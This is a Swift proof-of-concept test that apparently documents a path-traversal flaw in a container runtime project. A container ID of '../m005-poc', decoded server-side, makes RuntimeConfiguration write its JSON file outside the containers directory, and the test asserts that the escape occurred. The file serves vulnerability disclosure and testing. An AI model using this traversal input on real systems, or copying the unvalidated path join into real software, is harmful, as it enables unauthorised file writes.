//===----------------------------------------------------------------------===//
// M005 server-side PoC test.
// Demonstrates that a server-decoded ContainerConfiguration.id containing "../"
// reaches the RuntimeConfiguration write sink and escapes the intended
// appRoot/containers directory.
//===----------------------------------------------------------------------===//

import ContainerResource
import ContainerRuntimeClient
import Containerization
import Foundation
import Testing

struct M005ServerTraversalPoCTests {
    @Test
    func testServerDecodedContainerIDTraversalWritesRuntimeConfigOutsideContainersRoot() throws {
        let fm = FileManager.default

        let workspace = ProcessInfo.processInfo.environment["GITHUB_WORKSPACE"].map {
            URL(fileURLWithPath: $0, isDirectory: true)
        }

        let baseDir: URL
        if let workspace {
            baseDir = workspace.appendingPathComponent("m005-server-poc-workdir-\(UUID())", isDirectory: true)
        } else {
            baseDir = fm.temporaryDirectory.appendingPathComponent("m005-server-poc-workdir-\(UUID())", isDirectory: true)
        }

        let appRoot = baseDir.appendingPathComponent("com.apple.container", isDirectory: true)
        let containersRoot = appRoot.appendingPathComponent("containers", isDirectory: true)

        if workspace == nil {
            defer { try? fm.removeItem(at: baseDir) }
        }

        try fm.createDirectory(at: containersRoot, withIntermediateDirectories: true)

        // This is the malicious value that the official CLI rejects, but the
        // server-side JSON decode path must independently validate.
        let maliciousID = "../m005-poc"

        // Simulate the server harness behavior:
        // ContainersHarness.create()
        //   -> JSONDecoder().decode(ContainerConfiguration.self, from: data)
        let originalConfig = Self.makeContainerConfiguration(id: maliciousID)
        let encodedConfig = try JSONEncoder().encode(originalConfig)
        let decodedConfig = try JSONDecoder().decode(ContainerConfiguration.self, from: encodedConfig)

        #expect(decodedConfig.id == maliciousID, "Server-style JSON decode preserved the traversal ID")

        // Simulate the vulnerable server-side sink:
        // ContainersService.create()
        //   -> let path = self.containerRoot.appendingPathComponent(configuration.id)
        let serverConstructedPath = containersRoot.appendingPathComponent(decodedConfig.id, isDirectory: true)

        let initFs = Filesystem.virtiofs(
            source: "/path/to/initfs",
            destination: "/",
            options: ["ro"]
        )

        let kernel = Kernel(
            path: URL(fileURLWithPath: "/path/to/kernel"),
            platform: .linuxArm
        )

        let runtimeConfig = RuntimeConfiguration(
            path: serverConstructedPath,
            initialFilesystem: initFs,
            kernel: kernel,
            containerConfiguration: decodedConfig,
            containerRootFilesystem: nil,
            options: nil,
            runtimeData: nil
        )

        // Actual project sink:
        // RuntimeConfiguration.writeRuntimeConfiguration()
        //   -> createDirectory(parent)
        //   -> data.write(to: runtimeConfigurationPath)
        try runtimeConfig.writeRuntimeConfiguration()

        let writtenPath = runtimeConfig.runtimeConfigurationPath.standardizedFileURL.path
        let intendedContainersRoot = containersRoot.standardizedFileURL.path

        let expectedEscapedPath = appRoot
            .appendingPathComponent("m005-poc", isDirectory: true)
            .appendingPathComponent("runtime-configuration.json")
            .standardizedFileURL
            .path

        let safePathInsideContainers = containersRoot
            .appendingPathComponent("m005-poc", isDirectory: true)
            .appendingPathComponent("runtime-configuration.json")
            .standardizedFileURL
            .path

        let escapedContainersRoot =
            !(writtenPath == intendedContainersRoot || writtenPath.hasPrefix(intendedContainersRoot + "/"))

        let report = """
        M005 SERVER-SIDE CONTAINER ID TRAVERSAL POC
        BASE_DIR: \(baseDir.path)
        APP_ROOT: \(appRoot.path)
        INTENDED_CONTAINERS_ROOT: \(intendedContainersRoot)
        MALICIOUS_ID: \(maliciousID)
        SERVER_CONSTRUCTED_PATH_RAW: \(serverConstructedPath.path)
        RUNTIME_CONFIG_PATH_STANDARDIZED: \(writtenPath)
        EXPECTED_ESCAPED_PATH: \(expectedEscapedPath)
        SAFE_PATH_INSIDE_CONTAINERS_SHOULD_NOT_EXIST: \(safePathInsideContainers)
        FILE_EXISTS_AT_ESCAPED_PATH: \(fm.fileExists(atPath: expectedEscapedPath))
        FILE_EXISTS_INSIDE_CONTAINERS: \(fm.fileExists(atPath: safePathInsideContainers))
        ESCAPED_CONTAINERS_ROOT: \(escapedContainersRoot)
        """

        print(report)

        if let workspace {
            let resultPath = workspace.appendingPathComponent("m005-server-poc-result.txt")
            try report.write(to: resultPath, atomically: true, encoding: .utf8)
        }

        #expect(fm.fileExists(atPath: expectedEscapedPath), "runtime-configuration.json should be written at escaped path")
        #expect(!fm.fileExists(atPath: safePathInsideContainers), "runtime-configuration.json should not be under containers/m005-poc")
        #expect(writtenPath == expectedEscapedPath, "standardized write path should match escaped path")
        #expect(escapedContainersRoot, "write path escaped the intended containers root")
    }

    private static func makeContainerConfiguration(id: String) -> ContainerConfiguration {
        let image = ImageDescription(
            reference: "docker.io/library/alpine:latest",
            descriptor: .init(
                mediaType: "application/vnd.oci.image.manifest.v1+json",
                digest: "sha256:" + String(repeating: "0", count: 64),
                size: 0
            )
        )

        let process = ProcessConfiguration(
            executable: "/bin/sh",
            arguments: [],
            environment: [],
            workingDirectory: "/",
            terminal: false,
            user: .id(uid: 0, gid: 0),
            supplementalGroups: [],
            rlimits: []
        )

        return ContainerConfiguration(id: id, image: image, process: process)
    }
}
